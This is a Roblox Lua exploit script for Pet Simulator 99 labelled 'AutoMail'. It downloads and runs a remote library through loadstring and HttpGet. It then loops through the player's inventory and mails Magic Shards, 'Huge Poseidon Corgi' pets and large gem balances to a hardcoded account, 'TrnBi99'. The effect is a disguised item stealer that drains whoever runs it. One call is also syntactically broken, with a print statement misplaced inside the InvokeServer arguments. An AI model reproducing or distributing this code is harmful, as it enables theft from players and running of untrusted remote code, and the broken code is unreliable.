repeat wait() until game:IsLoaded()
wait(2)

getgenv().config = {
	userToMail = "TrnBi99",
	gemAmount = 2000000,
}

local TrungBLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/TrungB2/PS99/main/TrungBLib.lua')))()
local Window = TrungBLib:MakeWindow({Name = "AutoMail", HidePremium = false, SaveConfig = false, ConfigFolder = "TrungBTest"})

local Tab = Window:MakeTab(
    {
        Name = "Main",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    }
)

Tab:AddToggle(
    {
        Name = "Auto Mail (Huge, 50 Shards, Gems)",
        Default = false,
        Callback = function(v)
            config.autoMail = v
            spawn(autoMail)
        end
    }
)

TrungBLib:Init()

function autoMail()
    while task.wait() and config.autoMail do
        local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
        local result = saveModule.Get()
	local ms = result.Inventory.Misc
	for i, v in pairs(ms) do
		if v.id == "Magic Shard" then
			if v._am >= 50 then
				local args = {
					[1] = config.userToMail,
					[2] = "Magic Shard",
					[3] = "Misc",
					[4] = i,
					[5] = v._am or 1
				}
				game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
					unpack(args)
				print('Sended : '..v._am..' Shards to '..config.userToMail..'!')
				)
			end
		end
	end

	task.wait(0.5)

	local pet = result.Inventory.Pet
	for i, v in pairs(pet) do
	    if v.id == "Huge Poseidon Corgi" then
		local args = {
		    [1] = config.userToMail,
		    [2] = "Huge Poseidon Corgi",
		    [3] = "Pet",
		    [4] = i,
		    [5] = v._am or 1
		}
		game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		print('Sended : Huge Poseidon Corgi to '..config.userToMail..'!')
	    end
	end

	task.wait(0.5)
		
	local GetSave = function()
	    return require(game.ReplicatedStorage.Library.Client.Save).Get()
	end
	for i, v in pairs(GetSave().Inventory.Currency) do
	    if v.id == "Diamonds" then
		if v._am >= config.gemAmount then
			local args = {
				[1] = config.userToMail,
				[2] = v.id,
				[3] = "Currency",
				[4] = i,
				[5] = config.gemAmount - 10000
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			print('Sended : '..config.gemAmount..' Gems to '..config.userToMail..'!')
		end
	    end
	    task.wait(0.05)
	end
    end
end
